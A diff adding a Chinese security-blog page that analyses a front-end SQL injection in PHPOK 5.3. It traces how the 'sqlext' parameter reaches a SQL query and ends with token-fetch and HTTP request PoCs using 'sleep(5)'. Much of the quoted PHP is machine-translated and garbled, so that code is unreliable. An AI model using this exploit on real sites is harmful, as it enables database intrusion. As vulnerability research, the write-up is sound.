@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PHPOK 5.3 前台注入一、漏洞简介二、漏洞影响PHPOK 5.3 三、复现过程漏洞分析灵活获取参数：$this-&gt;get()方法 framework &#x2F; init.php＃get 最后的公共函数get（$ id，$ type &#x3D;“ safe”，$ ext &#x3D;“”） &amp;#123;      &#x2F;&#x2F; PGC进入获取     $ val &#x3D; isset（$ _ POST [$ id]）？$ _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="PHPOK 5.3 前台注入一、漏洞简介二、漏洞影响PHPOK 5.3 三、复现过程漏洞分析灵活获取参数：$this-&gt;get()方法 framework &#x2F; init.php＃get 最后的公共函数get（$ id，$ type &#x3D;“ safe”，$ ext &#x3D;“”） &amp;#123;      &#x2F;&#x2F; PGC进入获取     $ val &#x3D; isset（$ _ POST [$ id]）？$ _">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId30.png">
+<meta property="article:published_time" content="2022-07-08T06:26:02.226Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PHPOK/PHPOK 5.3 前台注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.226Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHPOK-5-3-前台注入"><a href="#PHPOK-5-3-前台注入" class="headerlink" title="PHPOK 5.3 前台注入"></a>PHPOK 5.3 前台注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHPOK 5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>灵活获取参数：$this-&gt;get()方法</p>
+<p>framework / init.php＃get</p>
+<pre><code>最后的公共函数get（$ id，$ type =“ safe”，$ ext =“”）
+&#123; 
+    // PGC进入获取
+    $ val = isset（$ _ POST [$ id]）？$ _POST [$ id]：（isset（$ _ GET [$ id]）？$ _GET [$ id]：（isset（$ _ COOKIE [$ id]）？$ _COOKIE [$ id]：&#39;&#39;））; 
+    if（$ val ==&#39;&#39;）&#123; 
+        if（$ type ==&#39;int&#39;|| $ type ==&#39;intval&#39;|| $ type ==&#39;float&#39;|| $ type ==&#39;floatval&#39;）&#123; 
+            返回0 ; 
+        &#125; else &#123; 
+            return”; 
+        &#125; 
+    &#125; 
+    //判断内容是否有转义，所有未转义的数据都直接转义
+    $ addslashes = false; 
+    if（function_exists（“ get_magic_quotes_gpc”）&amp;&amp; get_magic_quotes_gpc（））&#123; 
+        $ addslashes = true; 
+    &#125; 
+    if（！
+        $ addslashes）&#123; $ val = $ this-&gt; _ addslashes（$ val）; 
+    &#125;
+    返回$ this-&gt; format（$ val，$ type，$ ext）; 
+&#125;
+</code></pre>
+<p>跟进format函数：framework / init.php＃format</p>
+<pre><code>最终的公共函数格式（$ msg，$ type =“ safe”，$ ext =“”）
+&#123; 
+    if（$ msg ==“”）&#123; 
+        return ;; 
+    &#125; 
+    if（is_array（$ msg））&#123; 
+        foreach（$ msg as $ key =&gt; $ value）&#123; 
+            if（！is_numeric（$ key））&#123; 
+                $ key2 = $ this-&gt; format（$ key）; 
+                if（$ key2 ==``|| in_array（$ key2，array（&#39;＃&#39;，&#39;＆&#39;，&#39;％&#39;）））&#123; 
+                    unset（$ msg [$ key]）; 
+                    继续; 
+                &#125; 
+            &#125; 
+            $ msg [$ key] = $ this-&gt; format（$ value，$ type，$ ext）; 
+        &#125; 
+        if（$ msg &amp;&amp; count（$ msg）&gt; 0）&#123; 
+            返回$ msg; 
+        &#125; 
+        返回false; 
+    &#125;
+    if（$ type ==&#39;html_js&#39;||（$ type ==&#39;html&#39;&amp;&amp; $ ext））&#123; 
+        $ msg = stripslashes（$ msg）; 
+        if（$ this-&gt; app_id！=&#39;admin&#39;）&#123; 
+            $ msg = $ this-&gt; lib（&#39;string&#39;）-&gt; xss_clean（$ msg）; 
+        &#125; 
+        $ msg = $ this-&gt; lib（&#39;string&#39;）-&gt; clear_url（$ msg，$ this-&gt; url）; 
+        返回addslashes（$ msg）; 
+    &#125; 
+    //转义去除
+    $ msg = stripslashes（$ msg）; 
+    //格式化处理内容
+    开关（$ type）&#123; 
+        case&#39;safe_text&#39;：
+            $ msg = strip_tags（$ msg）; 
+            $ msg = str_replace（array（“ \\”，“&#39;”，&#39;“&#39;，” &lt;“，”&gt;“），&#39;&#39;，$ msg）; 
+        break; 
+        情况&#39;system&#39;：
+            $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \ _ \-] + $ / u”，$ msg）吗？false：$ msg;
+        打破; 
+        情况&#39;id&#39;：
+            $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \ _ \-] + $ / u”，$ msg）吗？false：$ msg; 
+        打破; 
+        情况&#39;复选框&#39;：
+            $ msg = strtolower（$ msg）==&#39;on&#39;吗？1：$ this-&gt; format（$ msg，&#39;safe&#39;）; 
+        打破; 
+        情况&#39;int&#39;：
+            $ msg = intval（$ msg）; 
+        打破; 
+        情况&#39;intval&#39;：
+            $ msg = intval（$ msg）; 
+        打破; 
+        情况&#39;float&#39;：
+            $ msg = floatval（$ msg）; 
+        打破; 
+        情况&#39;floatval&#39;：
+            $ msg = floatval（$ msg）; 
+        打破; 
+        案例“时间”：
+
+        打破; 
+        情况&#39;html&#39;：
+            $ msg = $ this-&gt; lib（&#39;string&#39;）-&gt; safe_html（$ msg，$ this-&gt; url）; 
+        打破; 
+        情况&#39;func&#39;：
+            $ msg = function_exists（$ ext）？$ ext（$ msg）：假; 
+        打破; 
+        情况&#39;text&#39;：
+            $ msg = strip_tags（$ msg）; 
+        打破; 
+        默认值：
+            $ msg = str_replace（array（“ \\”，“&#39;”，&#39;“&#39;，” &lt;“，”&gt;“），array（”＆＃92;“，”＆＃39;“，”＆quot; “，”＆lt;“，”＆gt;“），$ msg）; 
+        break; 
+    &#125; 
+    if（$ msg）&#123; 
+        $ msg =加上斜线（$ msg）; 
+    &#125; 
+    返回$ msg; 
+&#125;
+</code></pre>
+<p>格式默认为安全模式，也就是仅将\ &quot; &#39; &lt; &gt;实体编码。</p>
+<p>注入点：</p>
+<p>framework / api / index_control.php＃phpok_f</p>
+<pre><code>// ... 
+$ token = $ this-&gt; get（“ token”）; 
+if（！$ token）&#123; 
+    $ this-&gt; json（P_Lang（“接口数据异常”））;; 
+&#125; 
+$ this-&gt; lib（&#39;token&#39;）-&gt; keyid（$ this-&gt; site [&#39;api_code&#39;]）; 
+$ info = $ this-&gt; lib（&#39;token&#39;）-&gt; decode（$ token）; 
+if（！$ info）&#123; 
+    $ this-&gt; json（P_Lang（&#39;信息为空&#39;））; 
+&#125; 
+$ id = $ info [&#39;id&#39;];
+
+// 176行
+$ ext = $ this-&gt; get（&#39;ext&#39;）; 
+if（$ ext &amp;&amp; is_array（$ ext））&#123; 
+    foreach（$ ext as $ key =&gt; $ value）&#123; 
+        if（！$ value）&#123; 
+            继续；
+        &#125; 
+        // sqlext变量转义取消
+        if（$ key ==&#39;sqlext&#39;&amp;&amp; $ value）&#123; 
+            $ value = str_replace（array（&#39;＆＃39;&#39;，&#39;“”，&#39;’&#39;&#39;，&#39;＆＃34 ;&#39;），array（“&#39;”，&#39;“&#39;，”&#39;“，&#39;”&#39;），$ value）; 
+        &#125; 
+        $ param [$ key] = $ value; 
+    &#125; 
+&#125; 
+// $ id从加密的令牌中来
+/// sqlsql的值的函数只有_userlist，_arc_condition_single，_arc_condition 
+$ list = $ this-&gt; call-&gt; phpok（$ id，$ param）;
+</code></pre>
+<p>继续跟进phpok函数：framework / phpok_call.php＃phpok</p>
+<pre><code>公共功能phpok（$ id，$ rs =“”）
+&#123; 
+    // 76行
+    $ siteinfo = $ this-&gt; model（&#39;site&#39;）-&gt; get_one（$ rs [&#39;site&#39;]）; 
+    // 91行
+    if（substr（$ id，0,1）！=&#39;_&#39;）&#123; 
+    // $ id从令牌中来，为phpok表中identifier标识符，$ rs [&#39;site&#39;]可控为任意值
+    $ call_rs = $ this-&gt; load_phpoklist（$ id，$ rs [&#39;site&#39;]）; 
+    &#125; 
+    // 116行
+    $ func =&#39;_&#39;。$ call_rs [&#39;type_id&#39;]; 
+    // 131行动态调用函数_xxxx 
+    return $ 
+this- &gt; $ func（$ call_rs，$ cache_id）; &#125;
+</code></pre>
+<p>跟进load_phpoklist：framework / phpok_call.php＃load_phpoklist</p>
+<pre><code>私有函数load_phpoklist（$ id，$ siteid = 0）
+&#123; 
+    $ this-&gt; model（&#39;call&#39;）-&gt; site_id（$ siteid）; 
+    if（$ this-&gt; _ cache &amp;&amp; $ this-&gt; _ cache [$ id]）&#123; 
+        返回$ this-&gt; _ cache [$ id]; 
+    &#125; 
+    $ this-&gt; _ cache = $ this-&gt; model（&#39;call&#39;）-&gt; all（$ siteid，&#39;identifier&#39;）; 
+    if（$ this-&gt; _ cache &amp;&amp; $ this-&gt; _ cache [$ id]）&#123; 
+        返回$ this-&gt; _ cache [$ id]; 
+    &#125; 
+    返回false; 
+&#125;
+</code></pre>
+<h1 id="这一段代码-this-gt-model-39-call-39-gt-all-siteid-39-identifier-39-实现的是查询phpok表，其中identifier"><a href="#这一段代码-this-gt-model-39-call-39-gt-all-siteid-39-identifier-39-实现的是查询phpok表，其中identifier" class="headerlink" title="这一段代码$this-&gt;model(&#39;call&#39;)-&gt;all($siteid,&#39;identifier&#39;);实现的是查询phpok表，其中identifier"></a>这一段代码$this-&gt;model(&#39;call&#39;)-&gt;all($siteid,&#39;identifier&#39;);实现的是查询phpok表，其中identifier</h1><p>xxx的信息，然后在phpok()函数的131行进行动态调用其插入为type_id的值函数。</p>
+<p><img src="/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<p>例如我们要调用framework/phpok_call.php下的_arclist函数，我们可以选择：</p>
+<pre><code>http://0-sec.org/api.php?c=index&amp;f=phpok&amp;ext[site]=1&amp;token=加密(&#39;id=m_picplayer&#39;)
+</code></pre>
+<p>我们接着在framework/phpok_call.php电子邮件寻找柯林斯触发SQL的函数，从phpok表里我们可以看到其默认的TYPE_ID只有四个不同的值arclist，<br>，arc，catelist，project我们而需要找到拼接sqlext变量的函数：</p>
+<p>框架/ phpok_call.php＃_arclist</p>
+<pre><code>私有函数_arclist（$ rs，$ cache_id =&#39;&#39;）
+&#123; 
+    // 254行
+    $ condition = $ this-&gt; _ arc_condition（$ rs，$ flist，$ project）; 
+    //带入注入数据
+    $ array [&#39;total&#39;] = $ this-&gt; model（&#39;list&#39;）-&gt; arc_count（$ project [&#39;module&#39;]，$ condition）; 
+&#125;
+</code></pre>
+<p>跟进：framework / phpok_call.php＃_arc_condition</p>
+<p>直接拼接了sqlext</p>
+<pre><code>private function _arc_condition($rs,$fields=&#39;&#39;,$project=&#39;&#39;)
+&#123;
+    // 623行
+        if($rs[&#39;sqlext&#39;])&#123;
+        $condition .= &quot; AND &quot;.$rs[&#39;sqlext&#39;];
+    &#125;
+
+    // 671行
+    return $condition;
+&#125;
+</code></pre>
+<p>接着将结果带入了：</p>
+<pre><code>$ this-&gt; model（&#39;list&#39;）-&gt; arc_count（$ project [&#39;module&#39;]，$ condition）;
+</code></pre>
+<p>调用：framework / model / list.php＃arc_count 5.jpg</p>
+<p><img src="/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<p>拼接sql，调用$this-&gt;db-&gt;count($sql)</p>
+<p>framework / engine / db / mysqli.php＃count</p>
+<pre><code>公共功能计数（$ sql =“”，$ is_count = true）
+&#123; 
+    if（$ sql &amp;&amp; is_string（$ sql）&amp;&amp; $ is_count）&#123; 
+        $ this-&gt; set（&#39;type&#39;，&#39;num&#39;）; 
+        $ rs = $ this-&gt; get_one（$ sql）; 
+        $ this-&gt; set（&#39;type&#39;，&#39;assoc&#39;）; 
+        返回$ rs [0]; 
+    &#125; else &#123; 
+        if（$ sql &amp;&amp; is_string（$ sql））&#123; 
+            $ this-&gt; query（$ sql）; 
+        &#125; 
+        if（$ this-&gt; query）&#123; 
+            返回mysqli_num_rows（$ this-&gt; query）; 
+        &#125; 
+    &#125; 
+    返回false; 
+&#125;
+</code></pre>
+<p>根进get_one函数：framework / engine / db / mysqli.php＃get_one</p>
+<pre><code>公共功能get_one（$ sql =&#39;&#39;）
+&#123; 
+    if（$ sql）&#123; 
+        $ false = $ this-&gt; cache_false（$ sql）; 
+        if（$ false）&#123; 
+            返回false; 
+        &#125; 
+        if（$ this-&gt; cache_get（$ sql））&#123; 
+            返回$ this-&gt; cache_get（$ sql）; 
+        &#125; 
+        $ this-&gt; query（$ sql）;
+</code></pre>
+<p>根进$this-&gt;query($sql);：framework / engine / db / mysqli.php＃query</p>
+<p><img src="/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
+<p>最终将sql带入执行。</p>
+<p>当然，到这里，其实还有一个问题没有解决，我们需要如果拿到token=加密(&#39;id=m_picplayer&#39;)。</p>
+<p>框架/ API / index_control.php＃token_f</p>
+<pre><code>&#123; 
+    $ this-&gt; config（&#39;is_ajax&#39;，true）; 
+    if（！$ this-&gt; site [&#39;api_code&#39;]）&#123; 
+        $ this-&gt; error（P_Lang（“系统未配置接口功能”））; 
+    &#125; 
+    $ id = $ this-&gt; get（&#39;id&#39;，&#39;system&#39;）; 
+    if（！$ id）&#123; 
+        $ this-&gt; error（P_Lang（&#39;未指定数据调用标识&#39;））; 
+    &#125; 
+    $ this-&gt; model（&#39;call&#39;）-&gt; site_id（$ this-&gt; site [&#39;id&#39;]）; 
+    //限制范围，其中identifier = $ id 
+    $ rs = $ this-&gt; model（&#39;call&#39;）-&gt; get_one（$ id，&#39;identifier&#39;）; 
+    if（！$ rs ||！$ rs [&#39;status&#39;]）&#123; 
+        $ this-&gt; error（P_Lang（&#39;标识不存在或未启用&#39;））; 
+    &#125;
+
+  // 141行
+    $ array = array（&#39;id&#39;=&gt; $ id，&#39;param&#39;=&gt; $ param）; 
+    $ token = $ this-&gt; lib（&#39;token&#39;）-&gt; encode（$ array）; 
+    $ this-&gt; success（$ token）; 
+&#125;
+</code></pre>
+<p>其中第一个如果条件需要在后台生成api字符串：</p>
+<p><img src="/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<blockquote>
+<p>没开启的话，其实构造一个csrf的poc也是可以的</p>
+</blockquote>
+<p>第二个条件预期id=m_picplayer即可</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code>http://0-sec.org/api.php?c=index&amp;f=token&amp;id=m_picplayer
+</code></pre>
+<p><img src="/resource/PHPOK5.3%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
+<p>POC：</p>
+<pre><code>GET /api.php?c=index&amp;f=phpok&amp;token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&amp;ext[sqlext]=sleep(5)%23&amp;ext[site]=1 HTTP/1.1
+Host: 0-sec.org
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4
+Connection: close
+</code></pre>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6830">https://xz.aliyun.com/t/6830</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" data-id="cl5c2quij00esy8v1agpu1e8o" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PHPOK/PHPOK%205.5%20csrf+%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
